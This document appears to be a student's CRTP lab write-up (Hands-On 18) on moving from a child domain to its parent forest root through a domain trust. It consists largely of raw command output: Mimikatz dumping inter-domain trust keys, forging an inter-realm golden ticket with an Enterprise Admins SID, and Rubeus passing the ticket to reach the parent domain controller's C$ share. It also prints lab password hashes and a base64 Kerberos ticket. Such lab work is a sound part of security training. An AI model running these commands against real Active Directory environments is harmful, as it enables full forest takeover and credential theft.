# CRTP: Hands-On 18

```
• Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using the domain trust key.
```

## Using DA Accsess to escala priviledges

Access to dcorp-dc with svcadmin:

```
ERROR mimikatz_doLocal ; "http://172.16.100.162/SafetyKatz.exe" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::Trust /patch

Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)

  [ Out ] MONEYCORP.LOCAL ->
        from: da 54 36 e7 e2 48 0f 59 f7 06 76 7d 6f aa bf cb 13 33 92 9c 72 f9 69 c6 45 cd 68 30 80 1a 5b 8b 78 44 df 68 1b ac af 47 43 9e b8 8b c0 49 2c 65 47 34 bd f4 65 53 11 29 5c 93 26 ca 17 39 27 8a 76 7c 79 a0 17 40 0e 21 4f 66 aa 6a 48 16 06 f6 43 48 9b 3e 45 d5 97 53 d8 fe 59 ba 71 a9 a1 78 b8 20 42 66 b5 cf 38 ee 7d 82 1a 29 44 20 a7 e0 d9 c2 b1 33 e5 8f 8f 19 2e 50 80 b6 cc 6e 6b f5 7e 32 9c 06 ef 18 4b 30 56 af 5b 18 af ba 9c 66 1c e7 d4 fb d8 d3 a7 3e 07 3b 58 fd ab e9 a8 5f 70 3e 26 03 b3 0b e6 5f c6 82 1b e9 32 81 0b 96 57 03 06 64 8f 56 ac 91 24 16 c4 cc 90 8c a1 e2 f4 4b 3c 21 12 a9 13 49 01 2f 29 ad 38 79 f3 bf d4 57 8a 2c 67 c4 eb 23 95 ae 9c d3 b6 ab 5c c9 d6 28 4b ba db 9b c3 b4 db 49 82 74 59 85 94 ff
        * aes256_hmac       : dd56c2385c841b8cc8f605659ccc9e2c3baac8b1a17d6eaec41b634dd44041a1
        * aes128_hmac       : fa36404200f79d17370a021c38ce5302
        * rc4_hmac_nt       : 10b0a1bd45f80c0707e40a95c63ed690
        * rc4_hmac_old      : 10b0a1bd45f80c0707e40a95c63ed690
        * rc4_md4           : 10b0a1bd45f80c0707e40a95c63ed690
        * rc4_hmac_nt_exp   : 10b0a1bd45f80c0707e40a95c63ed690
        * rc4_hmac_old_exp  : 10b0a1bd45f80c0707e40a95c63ed690

  [  In ] -> MONEYCORP.LOCAL
        from: 35 40 49 cb db 7c 9e ef 5e 84 73 23 ec 37 ee 0b 72 f7 22 78 f1 90 29 55 ac 35 43 19 26 65 9a ca c3 ab c6 e7 7a a0 e1 e5 ee 59 ef 43 12 f8 da ae a9 65 2d 0b bd 8a 35 68 49 5d 44 4f 30 11 8a b9 72 57 0e c3 67 a9 5c f6 f0 1f 2d 16 cf 11 2a a4 10 9b 73 e9 82 46 7e 63 d0 39 84 e5 9e f4 6b 81 48 28 c6 13 16 6f 30 11 27 24 06 3f 43 1f a0 d8 ec 24 b8 78 96 98 c4 90 e7 50 ec 9a 0f 5b 56 54 ff 8f c3 e4 60 12 6f 74 02 eb de b1 d6 d9 90 0b b3 f7 73 a3 2a b7 10 fd 5a 6a ab 3e 9d 35 9d eb 04 1e 82 d5 57 93 56 9f 26 8f 09 20 ed f9 fe 6c 90 d4 94 c5 12 30 35 4d a2 94 bf a8 79 a7 65 b5 73 b0 cf eb 66 b7 1f 04 d5 2b 31 df 9d 4b a7 69 a3 18 6c 7d d5 d5 35 37 26 46 d3 61 d2 8d dd 11 c0 17 78 66 78 4b 7c 95 45 09 30 27 3b 34 c3 8e
        * aes256_hmac       : 1dd3dc6655d7bff1e9a2ea3d9777ec8f633d1b73cd314e6d378f50fc6a53ab79
        * aes128_hmac       : 64948af4cd22e9f46a09f6e6bbb1502e
        * rc4_hmac_nt       : d27fb7ee4e34dd921cdb629eb2b25777
        * rc4_hmac_old      : d27fb7ee4e34dd921cdb629eb2b25777
        * rc4_md4           : d27fb7ee4e34dd921cdb629eb2b25777
        * rc4_hmac_nt_exp   : d27fb7ee4e34dd921cdb629eb2b25777
        * rc4_hmac_old_exp  : d27fb7ee4e34dd921cdb629eb2b25777
```
Generate intraforest golden ticket:
```
C:\Windows\system32>C:\AD\Tools\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz #  kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:10b0a1bd45f80c0707e40a95c63ed690 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\trust_moneycorp.kirbi
ERROR mimikatz_doLocal ; "" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz # kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:10b0a1bd45f80c0707e40a95c63ed690 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\trust_moneycorp.kirbi
User      : Administrator
Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
SID       : S-1-5-21-719815819-3726368948-3917688648
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-335606122-960912869-3279953914-519 ;
ServiceKey: 10b0a1bd45f80c0707e40a95c63ed690 - rc4_hmac_nt
Service   : krbtgt
Target    : moneycorp.local
Lifetime  : 5/2/2023 12:11:29 PM ; 4/29/2033 12:11:29 PM ; 4/29/2033 12:11:29 PM
-> Ticket : C:\AD\trust_moneycorp.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

mimikatz # exit
Bye!

C:\Windows\system32>dir C:\AD\trust_moneycorp.kirbi
 Volume in drive C has no label.
 Volume Serial Number is 1A5A-FDE2

 Directory of C:\AD

05/02/2023  12:11 PM             1,731 trust_moneycorp.kirbi
               1 File(s)          1,731 bytes
               0 Dir(s)   9,600,487,424 bytes free

```

Generate golden intraforest ticket with RC4 credentials in --> moneycorp.local
```
C:\Windows\system32>C:\AD\Tools\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:d27fb7ee4e34dd921cdb629eb2b25777 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\trust_moneycorp.kirbi
User      : Administrator
Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
SID       : S-1-5-21-719815819-3726368948-3917688648
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-335606122-960912869-3279953914-519 ;
ServiceKey: d27fb7ee4e34dd921cdb629eb2b25777 - rc4_hmac_nt
Service   : krbtgt
Target    : moneycorp.local
Lifetime  : 5/2/2023 12:17:03 PM ; 4/29/2033 12:17:03 PM ; 4/29/2033 12:17:03 PM
-> Ticket : C:\AD\trust_moneycorp.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

mimikatz # exit
Bye!

```

Use rubeus for inject kirbi ticket and request tgs

```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\trust_moneycorp.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'cifs/mcorp-dc.moneycorp.local'
[*] Using domain controller: mcorp-dc.moneycorp.local (172.16.1.1)
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      doIF3DCCBdigAwIBBaEDAgEWooIEvzCCBLthggS3MIIEs6ADAgEFoREbD01PTkVZQ09SUC5MT0NBTKIr
      MCmgAwIBAqEiMCAbBGNpZnMbGG1jb3JwLWRjLm1vbmV5Y29ycC5sb2NhbKOCBGowggRmoAMCARKhAwIB
      BqKCBFgEggRUEsxuAU2D+JNe3vuWqwHPkesQvw/jRsAsIGvx3qh8KZhUyGhSQXFjWPSkRxmderPlLlo3
      RIu4AsD33SwCXJWXkaqy7PmaPwi9PiiJWqU5L/0tOVwSjOKvY9kbH0jnCPgj26nPkL7AJEU15awr7Oh9
      Gdbm7ou/sojbK1R7PyK8VVVvRCH6k8FeE19rmmnf3yCIOeGxcWUkq5Hew0SWdJLGs7KYOaxRL4NVWKoD
      9MgwsjUBfx6WrDhLkmYeTgknLq0lafWXO7hn3XgPvBzgMos4uB8kV3g86/fH/sXfXjrckLhTqin3ZlTr
      q6sWBr3pqV/BCPljjQr8qlZa2BI8tausvVIal4fzXUUNjI3Ia0rzXr+Uou79avXoSQ/xBiiLvR27+xY+
      zvbq4dlba4tsNQk95wigS2MhjoDRZzsH9aMghW/I4xhMcDeg8G4SehyTGZxrfT1ZoiMt0UqtaiY+gPOR
      5ZE6q0nWR2YJDVQgUDjYPQocewabcRMtG9kTJZscEJfVJpph/VAZTKJNThNNB02BOMSqx+veKmWztGbk
      TF9vfsc6O1Difnk7faNDU3FOtjk3idDPccQ0SOsCoJR3mkf+kAwYjf4gub5OSaWhIPygS5Qqhn7d3+oD
      DTQknvA+Q9eovwNQdfvr9GVcEoc2HVcEQyeB++rZPV8mdD3RU4UazOTlXXCK6RD3tHIbl695dVUlRUjI
      BoPYWUqhAI/S15xrTEKRW/sIkWP5EydASk1yCZs4pEfnFrDKHKOdFHYYRrpF44fINjSo354sBI7ktNiW
      p1885VzQevkiSF7ut8eHcbQlxPN5RBSJ+MbVq8F352osEtBtCU/V1gIVflW6leKTVwGiqDxhIOuQp/Zf
      RVdIAfkUh+37+k5/jcvgnzCLUNctynSF+y0AftkJmC1oCvRaXJoXDWA7ALWEarWGPPoFTkYzPNuW8RtX
      gEEwCliKwPOjNa7UU1ZDPy6nLJAPwP5JquTsugM5KP0o0p7rxtqI770qD8zU44L+/3SEXbSWwDD4oVWw
      9w8rotdDITzEVMXbL8P7CKqL7s/IkGYKBLSeq5rKsth6XT0YykTvSF6vpDAsxTtQLGjzhJZ0wb2fhh0C
      jcccvlW5ANSfnJ+CfkBsWORKD7+ln+Dtig4+AjAAXwt/yclsOtpDjFXnH2KIErIRWTUpk/h1G/h5+Fu5
      w9Uogdz18shz+C3iXfV52yKVsrCYOOIgqQ0uANBFw3xcg/BP3QB45tl+sgrf5VTjsx4m3u46ngqVlvHz
      UiU/zLEtzxaEH7WFoRjKUFsQIQMOILzW6wyxEMBVL/WumVYXYW3AFbS+fnqFXzJA1NJ+Bl6EPbMmc/US
      8Cr1CMcTnLK30QOESnJeT5ByuepVa5YH1CaiZgwVfGjw4KZgk6j7A+3jT+w4cd+TZjuM2QEmhuPtWfiG
      rzzagbS63/iQF4QBYSsAzPfWYI7fJ3BAX2Kun5jmWRrhBRZoraOCAQcwggEDoAMCAQCigfsEgfh9gfUw
      gfKgge8wgewwgemgKzApoAMCARKhIgQgv5cynAT+pljcnyb4IjiXCBAgT+MCgPn4/eZdC4oZDVehHBsa
      ZG9sbGFyY29ycC5tb25leWNvcnAubG9jYWyiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA
      pQAApREYDzIwMjMwNTAyMTkxNzEyWqYRGA8yMDIzMDUwMzA1MTcxMlqnERgPMjAyMzA1MDkxOTE3MTJa
      qBEbD01PTkVZQ09SUC5MT0NBTKkrMCmgAwIBAqEiMCAbBGNpZnMbGG1jb3JwLWRjLm1vbmV5Y29ycC5s
      b2NhbA==

  ServiceName              :  cifs/mcorp-dc.moneycorp.local
  ServiceRealm             :  MONEYCORP.LOCAL
  UserName                 :  Administrator
  UserRealm                :  dollarcorp.moneycorp.local
  StartTime                :  5/2/2023 12:17:12 PM
  EndTime                  :  5/2/2023 10:17:12 PM
  RenewTill                :  5/9/2023 12:17:12 PM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  v5cynAT+pljcnyb4IjiXCBAgT+MCgPn4/eZdC4oZDVc=



```
Use TGT tikect:

```
C:\Windows\system32>klist

Current LogonId is 0:0x7bc1b51

Cached Tickets: (1)

#0>     Client: Administrator @ dollarcorp.moneycorp.local
        Server: cifs/mcorp-dc.moneycorp.local @ MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 5/2/2023 12:17:12 (local)
        End Time:   5/2/2023 22:17:12 (local)
        Renew Time: 5/9/2023 12:17:12 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

C:\Windows\system32>dir \\mcorp-dc.moneycorp.local\c$
 Volume in drive \\mcorp-dc.moneycorp.local\c$ has no label.
 Volume Serial Number is 1A5A-FDE2

 Directory of \\mcorp-dc.moneycorp.local\c$

05/08/2021  01:20 AM    <DIR>          PerfLogs
11/10/2022  10:53 PM    <DIR>          Program Files
05/08/2021  02:40 AM    <DIR>          Program Files (x86)
11/11/2022  07:33 AM    <DIR>          Users
11/26/2022  03:09 AM    <DIR>          Windows
               0 File(s)              0 bytes
               5 Dir(s)  13,735,362,560 bytes free
```
